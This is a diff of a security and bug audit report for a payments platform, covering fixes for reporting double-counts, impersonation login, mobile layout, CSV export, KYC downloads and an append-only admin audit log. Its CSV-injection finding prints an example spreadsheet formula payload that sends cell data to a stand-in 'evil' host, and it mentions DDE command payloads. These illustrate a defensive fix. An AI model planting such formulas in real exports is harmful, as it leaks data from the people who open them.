-5. *Refunds.* Succeeded refunds are aggregated per merchant and Bahrain day, the same bucket the worker uses (the refund row and its `refund.succeeded` event share the transaction time). The cursor is upserted, so a worker that never ran also starts after the rebuild.
+5. *Refunds (FP-300 completion, see above).* Succeeded refunds are aggregated per merchant and Bahrain day, the same bucket the worker uses (the refund row and its `refund.succeeded` event share the transaction time). The cursor is upserted, so a worker that never ran also starts after the rebuild.
 
 `volumeRows` is now the table's final row count (the documented meaning, `apps/admin/src/types.ts:240-241`), because refund-only days add rows. The `{ volumeRows, trendRows }` shape and the synchronous behaviour are unchanged.
 
-**Why this is the smallest correct fix:** it keeps the button's synchronous contract and its source-table rebuild, and adds only the three things whose absence causes the damage: worker exclusion, the covered watermark and the refund columns. *Why not reset the cursor to 0 and let the worker replay (the lead's option)?* The response would become "0 rows" and asynchronous, contradicting the UI ("Rebuilt N rows") and ADMIN.md ("instead of waiting for the worker"). *Why not set the watermark to the newest outbox row?* A transaction in flight at the snapshot whose xid is older would commit a row behind it, and the worker would skip that row forever. *Why not take the watermark below xmin and accept the straddling rows?* Those rows are counted by the rebuild and again by the worker. The 409 guard is the only exact choice.
+**Why this is the smallest correct fix:** it keeps the button's synchronous contract and its source-table rebuild, and adds only the two things whose absence causes the double-apply: worker exclusion and the covered watermark (the refund aggregate is the separate FP-300 completion). *Why not reset the cursor to 0 and let the worker replay (the lead's option)?* The response would become "0 rows" and asynchronous, contradicting the UI ("Rebuilt N rows") and ADMIN.md ("instead of waiting for the worker"). *Why not set the watermark to the newest outbox row?* A transaction in flight at the snapshot whose xid is older would commit a row behind it, and the worker would skip that row forever. *Why not take the watermark below xmin and accept the straddling rows?* Those rows are counted by the rebuild and again by the worker. The 409 guard is the only exact choice.
 
 **Proof:** `RBD-1: rebuild, then one worker pass, leaves the rollups unchanged and the refund columns intact` (`apps/api/src/admin/reportingRebuild.audit.test.ts`; it imports the worker's `runConsumerPass` and retries a 409 caused by other databases' transactions on the shared test cluster).
-- Before the fix: after the rebuild `refund_count: 0, refunds: 0` (expected 1 / 1,500).
-- With only the refund aggregate and no watermark move: after the worker pass `captured_count: 2, gross: 20000, refund_count: 2, refunds: 3000`.
+- Before the fix: after the rebuild `refund_count: 0, refunds: 0` (expected 1 / 1,500; the FP-300 half).
+- With only the refund aggregate and no watermark move (the bug itself): after the worker pass `captured_count: 2, gross: 20000, refund_count: 2, refunds: 3000`.
 - After the fix: `{captured_count 1, gross 10,000, voided 0, refund_count 1, refunds 1,500}` both after the rebuild and after the worker pass.
 - `routes/admin.test.ts`, `routes/analytics.test.ts` (55/55) and the reporting suite (17/17) pass.
 
 **Regression risk:** The button can now answer 409 under concurrent payment traffic (snapshot xmin is cluster-wide, so a long-running write transaction anywhere delays it); it then changes nothing. The worker is paused for the rebuild's duration, as it was effectively blocked by the `TRUNCATE` locks before. The rebuild still counts by source tables (e.g. seeded history without outbox rows), which is unchanged; the worker continues to apply only later events.
 
-Lines: prod +14/-1 (1 import, 1 comment line, 12 code lines), test +81/-0 (new file)
+Lines: prod +14/-1 (bug: +9 = 1 import, 1 comment, isolation + lock + 2-line 409 guard, 3-line cursor upsert; FP-300 completion: +5/-1 = 3-line refund aggregate, 2-line `volumeRows` count replacing the old return), test +81/-0 (new file)
 
 ---
 
@@ -3355,6 +2949,7 @@ Commit: `3d47d7a`. Lines: prod +3/-4 (SettlementPage.tsx) plus infra +2/-1 (pack
 ### ADMIN-IMP-3 · "View as merchant" never opens the dashboard: /v1/auth/me ignores the impersonation grant · H3 · Severity: Medium
 
 **Lead:** Team 45 heads-up list (W2), verified by us.
+**Category:** Bug
 
 **What's wrong:** In the admin console, "View as merchant" issues a grant and opens the merchant dashboard, and the dashboard immediately redirects to the merchant login page. The support view the feature exists for never appears, for any admin role.
 
@@ -3383,7 +2978,7 @@ Commit: `3d47d7a`. Lines: prod +3/-4 (SettlementPage.tsx) plus infra +2/-1 (pack
 +        return { merchantUserId: null, email: null, role: grant.merchantRole, merchant: { id: grant.merchantId, displayName: m.display_name, onboardingStatus: m.onboarding_status } };
        }
 ```
-Commit: `f71695a`. Lines: prod +11/-3 (2 imports, 2 comments, 7 code), test +38/-0.
+Commit: `f71695a`. Lines: prod +11/-3 (2 imports, 2 comments, 7 code), test +38/-0. Follow-up ADMIN-IMP-3b (`57c82d0`, below): prod +2/-0, test +28/-0. Row total: prod +13/-3, test +66/-0.
 
 **Why this is the smallest correct fix:** It uses the same precedence as `requireMerchantAuth`: a live merchant session first (the same `lookupSession` that `requireSession` called, so pending pre-OTP sessions are still refused, see AUTH-1), then the grant. It reuses `lookupImpersonationGrant`, the single definition of a live grant, which already refuses revoked, ended, expired and disabled-admin grants (ADMIN-IMP-2). The response keeps the `/me` shape and reports `role: "support"` (the grant's merchant role since ADMIN-IMP-1) with `merchantUserId`/`email` set to `null`, because no merchant user is signed in, so nothing is attributed to a real user. *Why not switch `/me` to `requireMerchantAuth`?* That would also let API keys call `/me`, which widens access, and its context has no `merchantUserId`. *Why not change `requireSession`?* `/logout` and every `requireRole` chain use it, and they must stay merchant-session only.
 
@@ -3393,97 +2988,13 @@ Commit: `f71695a`. Lines: prod +11/-3 (2 imports, 2 comments, 7 code), test +38/
 
 **Trap note:** `auth/middleware.ts:29` ("legacy — requireMerchantAuth replaced this everywhere except /auth/me") is false: `requireSession` still guards `/logout`, the API-key routes (`routes/apiKeys.ts:36,56,65`) and `routes/businessProfile.ts:51`, and none of them change here. `DashboardAuthContext.tsx:51-53` and `DashboardLayout.tsx:8-10` say impersonation does not exist in the merchant plane, which was never true server-side. Those comments are left as-is.
 
----
-
-<a id="f-checkout-375"></a>
-
-### CHECKOUT-375 · On a phone the checkout's CVV field is off-screen and dashboard pages overflow sideways ·  · Severity: Medium
-
-**Lead:** Team 45 heads-up list (item 2), verified by us.
-
-**What's wrong:** On a 375 px phone screen, the hosted checkout's expiry-month / expiry-year / CVV row is wider than the screen. The CVV box starts at the right edge, so the buyer has to pan sideways to find it. On the merchant dashboard, the transactions table and the detail pages are also wider than the screen, so the whole page scrolls sideways.
-
-**Why it happens:** `apps/web/src/pages/checkout/CheckoutPage.css:44-47` makes `.checkout-form-row` a flex row. Its three `<label>`s have no flex basis, and the inputs inside keep the browser's default width (about 20 characters each). Three default-width inputs do not fit in 343 px, and nothing lets them shrink. In `apps/web/src/dashboard.css:150-155` (pre-fix lines), `.dash-table` is `width: 100%` but grows to its content's width (six columns), and `.dash-dl` (`:166-170`) has a fixed `16rem` label column plus the value column. The dashboard has no rule for narrow screens.
-
-**What it breaks:** Measured in headless Edge with a 375 px mobile viewport (`Emulation.setDeviceMetricsOverride`, `mobile: true`): the checkout lays out **549 px** wide (CVV right edge at 549 px), the transactions page **665 px**, and a transaction's detail page **411 px**. Buyers paying from a phone, the normal case for a payment link, see a cut-off form. Merchants on a phone get pages that pan sideways.
-
-**Why it needed a fix:** Checkout is one of the three judged UI surfaces, and a payment page whose security-code field starts off-screen loses payments.
-
-**Fix:** `apps/web/src/pages/checkout/CheckoutPage.css:42-43,50-54` and `apps/web/src/dashboard.css:178-183`
-```diff
- .checkout-form input {
-   padding: 0.5rem;
-   font-size: 1rem;
-+  width: 100%; /* CHECKOUT-375: fill the label, so a 375 px screen keeps CVV on-screen */
-+  box-sizing: border-box;
- }
-+.checkout-form-row label {
-+  flex: 1;
-+  min-width: 0;
-+}
-```
-```diff
-+/* CHECKOUT-375: on a phone, tables scroll inside themselves and label/value pairs stack. */
-+@media (max-width: 640px) {
-+  .dash-table { display: block; overflow-x: auto; }
-+  .dash-dl { grid-template-columns: 1fr; }
-+}
-```
-Commit: `993c95a`. Lines: prod +13/-0 (CSS: 9 rules/declarations, 2 comments, 2 blank), test +0/-0.
-
-**Why this is the smallest correct fix:** The checkout change is three declarations on existing selectors plus one new selector. The three labels share the row equally and may shrink below their content width, and each input fills its label. The dashboard change only applies under 640 px, so desktop layout is untouched. *Why not wrap every `.dash-table` in an `overflow-x` `<div>`?* That edits about 10 page components for the same result. `display: block; overflow-x: auto` on the table itself, scoped to narrow screens, does it in one rule. *Why not `flex-wrap`?* With `min-width: 0` the fields never need to wrap, and three short fields on one line is the expected card-form layout.
-
-**Proof:** There is no unit test, because this is CSS and the repo has no DOM test runner. The proof is the measured layout from the same harness run on the same data, before and after (`docs/audit/evidence/ui/`): checkout 549 → **375 px** (CVV right edge 549 → 343 px), transactions 665 → **375 px** (the table scrolls inside itself), detail 411 → **375 px**. Screenshots: `checkout-375-{before,after}.png`, `dashboard-table-375-{before,after}.png`, `dashboard-detail-375-{before,after}.png`. At branch head `36cb2c7` the web suite passes 13/13 (CSS is not type-checked).
-
-**Regression risk:** At desktop width, the checkout's card-number and expiry inputs now fill the 420 px form instead of using the browser default width, a cosmetic change (`checkout-open-after.png`). Dashboard rules apply only at ≤ 640 px.
-
----
-
-<a id="f-recon-refunds"></a>
-
-### RECON-REFUNDS · Merchant reconciliation says "no gap" over three numbers that do not add up (refund lines not shown) · H1 / FP-300 · Severity: Medium
-
-**Lead:** Team 45 heads-up list (item 4, part 7), verified by us.
-
-**What's wrong:** After a refund, the merchant dashboard's Reconciliation page shows "Reconciled — no gap" under these figures: ledger payable 3.666 BHD, settlement payout 0.000 BHD, pending 4.643 BHD, gap 0.000 BHD. The caption says "Gap = ledger − payout − pending", but 3.666 − 0.000 − 4.643 = −0.977, not 0. The 0.977 BHD of unbatched refund (1.000 BHD refunded minus the 0.023 BHD fee reversal) is in the server's formula and missing from the page.
-
-**Why it happens:** REC-1 (FP-300 ☐5) added `pendingUnbatchedRefundsFils` and `nettedRefundsFils` to `GET /v1/settlement/reconciliation`, and the gap became `ledger − payout − pending − pendingUnbatchedRefunds` (`apps/api/src/settlement/query.ts:249-262,331`). The web type `ReconciliationReport` (`apps/web/src/types.ts:259-267`) was never updated. `ReconciliationPage.tsx:119-137` therefore renders only the old three terms and the old formula text, while showing the server's gap, which does include refunds.
-
-**What it breaks:** The merchant cannot check the page's own arithmetic. After any refund the page shows a contradiction ("no gap" over numbers with a 0.977 BHD hole), or a non-zero gap that the listed terms cannot explain. Reconciliation is exactly where a merchant needs every fil to be visible.
-
-**Why it needed a fix:** FP-300 ☐5 asks for refunds to tie out in reconciliation. The API now does that, and the page has to show the terms it ties out with.
-
-**Fix:** `apps/web/src/types.ts:265-266` and `apps/web/src/pages/settlement/ReconciliationPage.tsx:130-133,139-141`
-```diff
-   pendingUnbatchedFils: number;
-+  pendingUnbatchedRefundsFils: number; // RECON-REFUNDS: in the API's gap formula (REC-1), was missing here
-+  nettedRefundsFils: number;
-```
-```diff
-+            <dt>Refunds, not yet batched</dt>
-+            <dd>{bhd(report.pendingUnbatchedRefundsFils)}</dd>
-+            <dt>Refunds netted in settled batches (inside the payout above)</dt>
-+            <dd>{bhd(report.nettedRefundsFils)}</dd>
--            unbatched. A zero gap means every captured fil is accounted for in
--            either a settled batch or the pending queue.
-+            unbatched − refunds not yet batched. A zero gap means every captured
-+            and refunded fil is accounted for in either a settled batch or the pending queue.
-```
-Commit: `0208c59`. Lines: prod +8/-2, test +0/-0.
-
-**Why this is the smallest correct fix:** The page only displays values the API already returns, and it shows the formula the API already uses (`query.ts:331`). *Why also show `nettedRefundsFils`?* It is not a term of the gap. It sits inside the settlement payout, and labelling it that way explains why a payout can be lower than the captures. *Why not recompute the gap in the browser?* The server's gap is authoritative, and the page must not second-guess it. Negative amounts render because of UI-NEG-1, which `bhd` needed for exactly this row.
-
-**Proof:** There is no unit test: the change is to rendering only, and the repo has no DOM test runner. The field names are checked by `tsc --noEmit` against the shared shape, and the web suite passes 13/13 at branch head `36cb2c7`. Screenshots on the same data: `dashboard-reconciliation-before.png` shows 3.666 − 0.000 − 4.643 ≠ 0 under "no gap". `dashboard-reconciliation-after.png` shows the −0.977 BHD refund row, and 3.666 − 0.000 − 4.643 − (−0.977) = 0.000.
-
-**Regression risk:** None to the API. The endpoint already returns both fields (`query.ts:339-340`), and the request is unchanged.
-
-**Trap note:** `types.ts:258` ("YA: gapFils is a string here (pre-Jan contract)") is false. The API returns a number and the type says `number`. Left as-is.
+**Follow-up ADMIN-IMP-3b (ours, merged into this row):** with `/me` fixed, "View as merchant" still landed on React Router's "Unexpected Application Error! 404 Not Found" page; we found this while capturing the evidence for the fix above (lead: the same Team 45 heads-up list, W2). `handleImpersonate` (`apps/admin/src/pages/merchants/MerchantDetailPage.tsx:213-214`) opens `WEB_BASE_URL`, the web app's origin with path `/` (`apps/admin/src/api/client.ts:9-10`), and the web router defined only `/pay/:token`, `/dashboard/login` and `/dashboard/*`, with no `errorElement`. A merchant typing the bare dashboard address got the same page. `docs/audit/evidence/ui/view-as-merchant-imp3-only.png` (taken at `9b54967`, the `/me` fix applied, this one not) shows the 404. Fix (`57c82d0`, `apps/web/src/router.tsx:28-29`): one route, `{ path: "/", element: <Navigate to="/dashboard" replace /> }`, plus a comment; `/dashboard` then goes through the existing `RequireDashboardAuth` guard, and the route sits outside the `DashboardAuthProvider` subtree, so `/pay/:token` still makes no auth calls. Rejected: changing the admin link to `${WEB_BASE_URL}/dashboard` (2 lines, leaves the bare URL a 404 for merchants, and gives `//dashboard` with a trailing-slash base URL); an `errorElement` (a nicer 404 that still goes nowhere). Proof: `the web root routes into the dashboard instead of a 404` (`apps/web/src/router.test.ts`) fails before with `Error: No route matches URL "/"` in `router.state.errors` and passes after (last match is the `Navigate`); screenshots `view-as-merchant-{before,after}.png` show it end to end. Side note, left as-is: `MerchantDetailPage.tsx:213` calls `window.open(..., "noopener")`, which always returns `null`, so the "blocked the new tab" fallback link always shows; it is harmless. Lines: prod +2/-0, test +28/-0.
 
 ---
 
 <a id="f-cw-10"></a>
 
-### CW-10 · Webhook transport buffers the whole receiver response with no byte cap ·  · Severity: Medium
+### CW-10 · Webhook transport buffers the whole receiver response with no byte cap · Severity: Medium
 
 **What's wrong:** `createFetchTransport` read the receiver's response with `await response.text()`, which buffers the entire body in memory, although callers only keep a 2,000-character excerpt (`webhooks/dispatcher.ts:188/200/211` store `left($4, 2000)`, `webhooks/testSend.ts:69` slices to 2,000).
 
@@ -3610,11 +3121,1122 @@ Commit: `b809526`. Lines: prod +9/-3, test +60/-1.
 
 ---
 
+<a id="f-sec9"></a>
+
+### SEC9 · Transactions CSV export writes caller-supplied references as live spreadsheet formulas, and a bare CR splits a row · Severity: Medium
+
+**Lead:** Team 45 heads-up list (SEC9), verified by us.
+
+**What's wrong:** `GET /v1/transactions/export` writes each transaction's `reference` into the CSV with only comma/quote/LF quoting. A reference that starts with `=`, `+`, `-`, `@`, TAB or CR is written as-is, so Excel or Sheets evaluates it as a formula when finance opens the file (CSV/formula injection, CWE-1236). A reference that contains a bare CR is not quoted, and spreadsheet readers treat CR as a line break, so the row splits in two and the columns after it shift. There is no formula guard at all in this repo (the lead described a guard that misses TAB/CR; ours has none).
+
+**Why it happens:** `apps/api/src/transactions/exportCsv.ts:16-21` `csvEscape` quotes only on `,`, `"` or `\n`. The reference comes from the API-key caller (`POST /v1/transactions` body `reference`, `routes/transactions.ts:71`, stored unvalidated by `payments/authorize.ts:107`), typically echoing an order id or customer-entered text from the merchant's shop. `buildTransactionsExportCsv` (`:23-32`, called by `routes/transactions.ts:149`) passes it through `csvEscape` and nothing else.
+
+**What it breaks:** A reference such as `=HYPERLINK("http://evil/?"&A1,"open")` becomes a clickable link that leaks the cell data when a finance user opens the export; `=cmd|...` style payloads trigger DDE prompts in older Excel. A reference with a CR breaks the row structure, so the reconciliation sheet has misaligned amounts.
+
+**Why it needed a fix:** the export is the file the merchant's finance team opens in a spreadsheet; the security review checks for this class. The value is outside the dashboard user's control (it comes from the integration), so the user cannot defend against it.
+
+**Fix:** `apps/api/src/transactions/exportCsv.ts:17-18`
+```diff
+ function csvEscape(value: string): string {
+-  if (value.includes(",") || value.includes('"') || value.includes("\n")) {
++  if (/^[=+\-@\t\r]/.test(value)) value = `'${value}`; // SEC9 (CWE-1236): a spreadsheet would run it as a formula
++  if (value.includes(",") || value.includes('"') || value.includes("\n") || value.includes("\r")) {
+```
+A leading formula character gets the OWASP-recommended `'` prefix, so the spreadsheet shows text; a CR anywhere forces RFC 4180 quoting.
+
+**Why this is the smallest correct fix:** `csvEscape` is the single place the free-text column is serialised. *Why not reject such references at authorize?* That changes the checkout/authorize contract, which we must not touch, and leaves rows already stored. *Why not escape every column?* The other columns are a UUID, a status enum, `formatBhd` amounts and an ISO timestamp, which never carry user text; prefixing a negative amount would corrupt the number. *Why not strip the characters?* That changes the merchant's reference; the prefix is the recognised neutraliser and is visible.
+
+**Proof:** `SEC9: formula-leading references are neutralised and a bare CR cannot split a row` (`apps/api/src/transactions/exportCsv.test.ts`). Before the fix the references came back raw (`=HYPERLINK(...)`, `+1+1`, `\r=1`, unquoted `a\rb`). After: each formula-leading value starts with `'` and CR-bearing values are quoted.
+
+**Regression risk:** only references that begin with `= + - @ TAB CR` change (a visible leading `'`); ordinary references such as `order-1` are byte-identical. `exportCsv.test.ts`, `routes/transactions.test.ts` and `routes/transactions.audit.test.ts` pass (22/22).
+
+Lines: prod +2/-1, test +11/-0
+
+---
+
+<a id="f-sec4b"></a>
+
+### SEC4b · A KYC document with an Arabic (non-Latin-1) filename cannot be downloaded: 500 · Severity: Medium
+
+**Lead:** Team 45 heads-up list (SEC4, Content-Disposition part), verified by us.
+
+**What's wrong:** `GET /v1/merchants/:merchantId/kyc/documents/:documentId/file` and `/thumbnail` return 500 `ERR_INVALID_CHAR` ("Invalid character in header content [content-disposition]") for any document whose original filename has a character above U+00FF, for example `سجل تجاري.pdf`. A Bahraini merchant's Arabic-named commercial registration uploads fine and then can never be opened. A filename with `"` produces a malformed header, and one with CR/LF also 500s.
+
+**Why it happens:** `apps/api/src/routes/kyc.ts:100` and `:117` interpolate the stored, client-supplied `file_name` raw into `inline; filename="${file.fileName}"`. Node's `setHeader` only accepts Latin-1 header values and throws on anything else; the throw happens in `writeHead`, after the route returned, so the error handler cannot even send its JSON body (the log shows a second `FST_ERR_REP_INVALID_PAYLOAD_TYPE`).
+
+**What it breaks:** the owner and finance roles cannot view their own uploaded KYC documents; the same request fails every time, so support sees a recurring 500 for every merchant with a non-Latin filename. Onboarding review that relies on the merchant re-checking an upload stalls.
+
+**Why it needed a fix:** Arabic filenames are the normal case for a Bahrain business; a download that can never succeed is a functional failure, and an unhandled header exception is noise for the security review (CR/LF reaching `setHeader`).
+
+**Fix:** `apps/api/src/routes/kyc.ts:100,117`
+```diff
+-      reply.header("Content-Disposition", `inline; filename="${file.fileName}"`);
++      reply.header("Content-Disposition", `inline; filename*=UTF-8''${encodeURIComponent(file.fileName)}`); // SEC4b: RFC 5987, header values must be Latin-1
+```
+(both handlers). RFC 6266 / RFC 5987 `filename*` carries the UTF-8 name percent-encoded, so the header is pure ASCII; every current browser decodes it back to the original name.
+
+**Why this is the smallest correct fix:** the same one-expression change at the only two places the header is built. *Why not also keep an ASCII `filename=` fallback?* It needs a transliteration rule and only helps pre-2012 browsers. *Why not sanitise the name at upload?* Stored rows already hold such names and the merchant's original filename is worth keeping. *Why not drop the header?* The browser would then name the file after the document id.
+
+**Proof:** `SEC4b: a KYC document with an Arabic filename downloads with an RFC 5987 filename*` (`apps/api/src/routes/securityHeaders.audit.test.ts`). Before the fix: `expected: 200, actual: 500` with `ERR_INVALID_CHAR`. After: 200 with `inline; filename*=UTF-8''%D8%B3%D8%AC%D9%84...`.
+
+**Regression risk:** the header format changes from `filename="x.pdf"` to `filename*=UTF-8''x.pdf` for ASCII names too; no test or UI parses it (grep), and browsers show the same name. `app.test.ts` (KYC upload flow) passes.
+
+Lines: prod +2/-2, test +16/-1
+
+---
+
+<a id="f-c5"></a>
+
+### C5 · The admin audit log can be rewritten or deleted · H3 · Severity: Medium
+
+**Lead:** Team 45 heads-up list (C5), verified by us.
+
+**What's wrong:** `admin_audit_log`, the only record of privileged admin actions (KYC decisions, impersonation, settlement re-runs, balance rebuilds, credits and adjustments), accepts any `UPDATE` and `DELETE`. Its action, target, admin and timestamp can be changed after the fact, and rows can be removed, so the trail proves nothing.
+
+**Why it happens:** `db/migrations/0034_admin_audit_log.sql` creates the table with no trigger, rule or revoke; nothing later adds one. The comment at `apps/api/src/adminAudit/log.ts:105` ("YA: append-only is enforced by a trigger in 0034, update only allowed on outcome/metadata") is false: 0034 has no trigger. The ledger got this protection in LED-1 (0084); the audit log never did.
+
+**What it breaks:** any path that reaches SQL with the API's role (a future injection, a buggy job, an operator "cleaning up") can erase or relabel the evidence of an admin action, for example turn an `impersonation_start` into a `kyc_review` or delete the row of a manual balance adjustment. Case file H3 ("some admin actions don't seem to have the right role checks") is exactly the investigation that needs this trail to be trustworthy.
+
+**Why it needed a fix:** an audit trail that can be edited is not an audit trail; the 0034 contract says every privileged action leaves exactly one row, which only holds if the row cannot be deleted or rewritten.
+
+**Fix:** new `db/migrations/0102_admin_audit_log_append_only.sql`: a `BEFORE UPDATE OR DELETE` row trigger that raises `admin_audit_log is append-only`, except for an `UPDATE` that leaves `id`, `admin_user_id`, `action`, `target_type`, `target_id` and `created_at` unchanged and only adds to `metadata` (`NEW.metadata @> OLD.metadata`). That is exactly what the one legitimate writer, `markAdminAuditOutcome` (`adminAudit/log.ts:112`, `outcome = $2, metadata = metadata || $3`), does for the cross-process actions (`routes/admin.ts:140-206, 295-307`); its patches only add keys (`error`, `message`, `merchantResultCount`, `rebuiltCount`, ...).
+
+**Why this is the smallest correct fix:** one trigger, the same pattern as LED-1's 0084, and no application change. *Why not reject every UPDATE?* It would break the documented two-phase outcome recording for settlement re-runs and balance rebuilds. *Why not `REVOKE UPDATE, DELETE`?* The app connects as the table owner, which a revoke does not restrict, and it would also block the outcome update. *Why not move outcomes to a second insert-only table?* Schema and code change for the same guarantee.
+
+**Proof:** `C5: admin_audit_log rows cannot be rewritten or deleted, only given an outcome` (`scripts/admin_audit_append_only.audit.test.ts`). Before the migration: `[allowed, allowed, allowed, allowed, allowed]` for outcome+metadata merge, action rewrite, back-dating, metadata overwrite and delete. After: `[allowed, rejected, rejected, rejected, rejected]`.
+
+**Regression risk:** repo-wide grep finds no other `UPDATE` or `DELETE` on `admin_audit_log` in TS, Go, scripts, ops or tests. The dev seed resets the table with `TRUNCATE ... CASCADE` (`db/seed/generate.ts:212`), which row triggers do not see. `routes/admin.test.ts`, `adminAudit/*.test.ts`, `adminMerchantsRecompute.audit.test.ts`, `adminCredits.test.ts` and `adminBalanceAdjustments.test.ts` pass (67/67) with the trigger applied.
+
+**Trap note:** `adminAudit/log.ts:104-105` (an "am" question answered by "YA" with a trigger that never existed) is left in place in code we do not otherwise touch; this migration makes the claim true.
+
+Lines: prod +17/-0 (migration 0102), test +48/-0
+
+---
+
+<a id="f-hunt-3"></a>
+
+### HUNT-3 · Dashboard payout trends show a paid payout as "closed" with no paid date, forever · Severity: Medium
+
+**What's wrong:** `GET /v1/analytics/payout-trends`, which the dashboard overview renders as a payouts table with a status and a "paid" column (`apps/web/src/pages/overview/OverviewPage.tsx:164,168`), reports every batch that was paid after its close event as `status: "closed"`, `paidAt: null`. In the normal flow (close at the end of the Bahrain day, pay later) that is every batch.
+
+**Why it happens:** the reporting consumer writes `merchant_payout_trends` once, in `applyBatchClosed` (`apps/reporting/src/consumer/applyEvent.ts:83-118`), copying `settlement_batches.status` and `paid_at` as they are when it processes `settlement.batch_closed`. At that moment the batch is `closed`. `MarkBatchPaid` (`apps/settlement/internal/settlement/batch.go:366`) later sets `status = 'paid', paid_at = now()`, and the daemon enqueues a `settlement.paid` outbox event for it (`payout_notify.go`, aggregate id = batch id). But the consumer selects only `REPORTING_EVENT_TYPES` (`runConsumerPass.ts:8-13`), which did not include `settlement.paid`, so nothing ever refreshed the row. `getPayoutTrends` (`apps/api/src/analytics/query.ts:176-195`) reads only that row.
+
+**What it breaks:** merchants see their payouts as not yet paid, with no paid date, after the money has gone out; support gets "where is my payout?" tickets the data cannot answer. Only a full `reporting rebuild` (which re-reads the live batch) corrects it, until the next batch.
+
+**Why it needed a fix:** the payouts widget is the merchant's view of settlement; showing a paid payout as unpaid is wrong data on a money screen.
+
+**Fix:** `apps/reporting/src/consumer/runConsumerPass.ts:13` and `applyEvent.ts:202-204`
+```diff
+   "refund.succeeded", // FP-300: refunds roll into merchant_daily_volume (applyDailySummaryRollup)
++  "settlement.paid", // HUNT-3: the batch is paid after its close event; refresh the payout-trend status
+ ];
+@@
++    case "settlement.paid": // HUNT-3: copy the live status/paid_at; batch_closed only saw the batch as 'closed'
++      await client.query(`UPDATE merchant_payout_trends t SET status = sb.status, paid_at = sb.paid_at, last_updated_at = now() FROM settlement_batches sb WHERE sb.id = t.settlement_batch_id AND sb.id = $1`, [row.aggregate_id]);
++      return;
+```
+The consumer now reads the event that already exists for exactly this transition and copies the batch's live status and paid date into the trend row, the same source `applyBatchClosed` uses.
+
+**Why this is the smallest correct fix:** it reuses the existing event and the existing source of truth, inside the read model the widget is designed around (`live: false`, `readModelAsOf`). *Why not join `settlement_batches` in `getPayoutTrends`?* That bypasses the documented lagged read model for one widget and changes an API query path. *Why not add a new outbox event in Go?* `settlement.paid` already carries the batch id. The `UPDATE` is idempotent, so a replay (`cli/rebuild.ts`) or a duplicate event is harmless; if the paid event is applied before the close event, it matches no row and `applyBatchClosed` later copies the live `paid` status itself.
+
+**Proof:** `HUNT-3: a batch paid after its close event shows as paid, with its paid date, in payout trends` (`apps/reporting/src/consumer/payoutTrendPaid.audit.test.ts`). Before: `the consumer must read settlement.paid events` (and the row stayed `closed`). After: passes; the row shows `paid` with the batch's `paid_at`.
+
+**Regression risk:** the reporting suite passes (17/17), including `cli/rebuild.test.ts` (rollups after a rebuild match incremental processing), and `routes/analytics.test.ts` passes (13/13). Residual gaps, not changed: the daemon enqueues `settlement.paid` only for batches with `net_payout_fils > 0` (`payout_notify.go`), so a zero-net batch still shows `closed`; and rows already stale before this deploy need one `reporting rebuild`, because the cursor has already passed their `settlement.paid` events.
+
+Lines: prod +4/-0, test +45/-0
+
+---
+
+<a id="f-f2-window"></a>
+
+### F2-WINDOW · The March residue sweep reads a UTC month, not the Bahrain month · F2, G1/H5 (timezone) · Severity: Low
+**What's wrong:** `monthBounds` in `scripts/reconcile_march.ts:16-18` builds the March window from UTC midnights (2026-03-01T00:00Z … 2026-04-01T00:00Z). FilsPay's business day, and so its month, runs midnight to midnight **Asia/Bahrain** (UTC+3).
+
+**Why it happens:** `Date.UTC(year, month - 1, 1)` is UTC midnight. Bahrain midnight is three hours earlier (21:00Z on the previous day). The existing test asserted `start.getUTCMonth() === 2`, which only holds for the UTC window, so it pinned the bug.
+
+**What it breaks:** captures between 00:00 and 03:00 Bahrain time on 1 March fall outside the sweep, while captures between 00:00 and 03:00 Bahrain time on 1 April (31 March 21:00-24:00Z) are swept into March. The residue is booked to the wrong month: three hours of residue go missing at one end and three hours from the next month are added at the other.
+
+**Why it needed a fix:** month-end write-offs must match the books, which close on the Bahrain day (case file: "Settlement closes every day at midnight, Bahrain time").
+
+**Fix:** `scripts/reconcile_march.ts:17`
+```diff
+-  return { start: new Date(Date.UTC(year, month - 1, 1)), end: new Date(Date.UTC(year, month, 1)) };
++  return { start: new Date(Date.UTC(year, month - 1, 1, -3)), end: new Date(Date.UTC(year, month, 1, -3)) }; // Asia/Bahrain (UTC+3) midnights
+```
+Lines: prod +1/−1, test +3/−2.
+
+**Why this is the smallest correct fix:** one expression; Bahrain has no DST, so a fixed −3 h is exact. Why not a timezone library or `Intl`? It would add code and dependencies for a fixed offset.
+
+**Proof:** `scripts/reconcile_march.test.ts` "monthBounds for March 2026 spans 31 days", with assertions corrected to `2026-02-28T21:00:00.000Z` / `2026-03-31T21:00:00.000Z` (case file cited): before `actual: '2026-03-01T00:00:00.000Z'`, after pass. Sweep tests 4/4.
+
+**Regression risk:** only this one-off script uses `monthBounds`. The printed "window:" line now shows the UTC dates of the Bahrain boundaries (2026-02-28 .. 2026-03-31).
+
+**Trap note:** the old assertion `start.getUTCMonth() === 2` encoded the UTC assumption (the same "UTC midnight" claim as the quarantined AI configs).
+
+---
+
+<a id="f-auth-1-rpt"></a>
+
+### AUTH-1·rpt · Reporting export-summary has no authentication gate · H3 · Severity: Low
+**What's wrong:** `GET /v1/reporting/export-summary` (`apps/api/src/routes/reporting.ts:79`) is the only reporting route registered without `requireMerchantAuth`.
+
+**Why it happens:** the handler reads `request.merchantAuth!.merchantId`. The `!` tells TypeScript the value exists, but no preHandler ever sets it for this route. The file's own header says every route uses `requireMerchantAuth` (`:18`).
+
+**What it breaks:** an anonymous request throws a TypeError and gets a 500 (an availability and noise problem). If any future hook populated `merchantAuth` loosely, it would become a data exposure. No data leaks today.
+
+**Why it needed a fix:** every merchant-data route must refuse anonymous callers with 401, not crash.
+
+**Fix:** `reporting.ts:79` `app.get("/export-summary", { preHandler: requireMerchantAuth }, async (request) => {`. Lines: prod +1/−1, test +28/−0.
+
+**Why this is the smallest correct fix:** the same one-line gate its sibling routes use.
+
+**Proof:** `routes/reporting.audit.test.ts` "export-summary requires a merchant session (401, not a 500 crash)": before `actual: 500`, after 401.
+
+**Regression risk:** none; authenticated callers see the same response.
+
+**Trap note:** the non-null assertion `merchantAuth!` silenced the type checker that would otherwise have flagged the missing gate.
+
+---
+
+<a id="f-auth-9"></a>
+
+### AUTH-9 · OTP verify never re-issues the merchant cookie, so fp_sid keeps the 10-minute pending Max-Age · Severity: Low
+
+**Lead:** Team 45 heads-up list (W1) and our 03_findings AUTH-9, verified by us.
+
